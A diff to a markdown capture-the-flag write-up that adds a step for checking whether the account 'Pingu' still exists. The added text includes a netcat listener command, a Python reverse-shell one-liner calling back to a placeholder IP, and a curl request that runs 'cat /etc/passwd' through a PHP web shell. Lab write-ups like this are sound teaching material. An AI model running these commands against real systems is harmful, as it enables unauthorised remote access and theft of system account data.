@@ -167,10 +167,25 @@ Thai section requires research to determine if the users old account is active. 
 
 ## How many files are in the current directory? ##
 
-This answer I obtained by utilizing the `ls` function on the command screen that we gained access to from the previous excersise which shows that there are `3` files and provides the following output:
+I obtained this answer by utilizing the `ls` function on the command screen that we gained access to from the previous excersise. The following output shows that there are `3` files:
 
 ![image](https://user-images.githubusercontent.com/61631671/124051064-c0c9f380-d9e9-11eb-8128-c91fda4cbb90.png)
 
+## Do I still hvae an account? ##
+
+To begin you need to open up a listening port using netcat on your machine `nc -lnvp 1234`
+
+Reverse shell is needed to perform the command neccessary to solve this problem. I used *python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((`"<GIVEN IP ADDRESS>"`,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'* 
+
+I used  *curl -s --data-urlencode "cmd=cat /etc/passwd" -X POST http://`PROVIDED IP ADDRESS`/2591c98b70119fe624898b1e424b5e91.php | grep -v -e "^$" | grep -v "<"* .I used the `curl` command since we are transferring data and the flags needed to obtain the answer: `yes`
+
+&nbsp; 
+
+![image](https://user-images.githubusercontent.com/61631671/124052796-1d7add80-d9ed-11eb-9a56-3ab292950d53.png)
+
+&nbsp; 
+
+As you can see *"Pingu"* is still listed as an account.
 
 
 
@@ -179,10 +194,15 @@ This answer I obtained by utilizing the `ls` function on the command screen that
 
 
 
-## *Reference* ##
+## *References* ##
 
+[netcat](https://nmap.org/ncat/)
+&nbsp;  
 [sqlmap](https://sqlmap.org/) 
+&nbsp;  
 [Python - Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+&nbsp;  
+[curl](https://www.tutorialspoint.com/unix_commands/curl.htm)
 
 
 
